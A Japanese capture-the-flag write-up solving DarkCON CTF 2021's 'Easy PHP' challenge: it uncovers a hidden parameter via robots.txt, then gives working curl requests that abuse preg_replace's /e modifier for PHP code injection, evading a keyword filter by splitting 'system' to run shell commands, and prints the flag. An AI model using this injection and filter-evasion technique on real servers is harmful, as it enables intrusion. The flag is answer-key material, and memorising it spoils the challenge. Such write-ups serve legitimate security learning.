# Easy PHP:Web:384pts
```
Please note....
Note: This chall does not require any brute forcing
```
[Link](http://easy-php.darkarmy.xyz/)  

# Solution
アクセスしても文字が表示されるだけのようだ。  
```bash
$ curl http://easy-php.darkarmy.xyz/
Welcome DarkCON CTF !!
```
robots.txtをみる。  
```bash
$ curl http://easy-php.darkarmy.xyz/robots.txt
?lmao
```
謎のクエリパラメータが出てくるので、指定しアクセスすると以下のようなソースが見られた。  
?lmao  
[site.png](site/site.png)  
`preg_replace`が用いられているが、e修飾子によって第二引数がphpコードとして評価されることが知られている。  
`is_payload_danger`によってある程度はじかれるようだが、`eval`は通るようだ。  
```bash
$ curl "http://easy-php.darkarmy.xyz/?bruh=system('')&nic3=/a/e"
Amazing Goob JOb You :) 
$ curl "http://easy-php.darkarmy.xyz/?bruh=eval('')&nic3=/a/e"
Welcome DrkCON CTF !!Welcome DarkCON CTF !!
$ curl "http://easy-php.darkarmy.xyz/?bruh=eval('echo(123456789);')&nic3=/a/e"
123456789Welcome DrkCON CTF !!Welcome DarkCON CTF !!
```
systemを文字列として分割してやればよい。  
```bash
$ curl "http://easy-php.darkarmy.xyz/?bruh=eval('syste'.'m(ls);')&nic3=/a/e"
config.php
flag210d9f88fd1db71b947fbdce22871b57.php
index.php
robots.txt
Welcome DrkCON CTF !!Welcome DarkCON CTF !!
$ curl "http://easy-php.darkarmy.xyz/flag210d9f88fd1db71b947fbdce22871b57.php"
darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!}
```
隠しphpにflagが書かれていた。  

## darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!}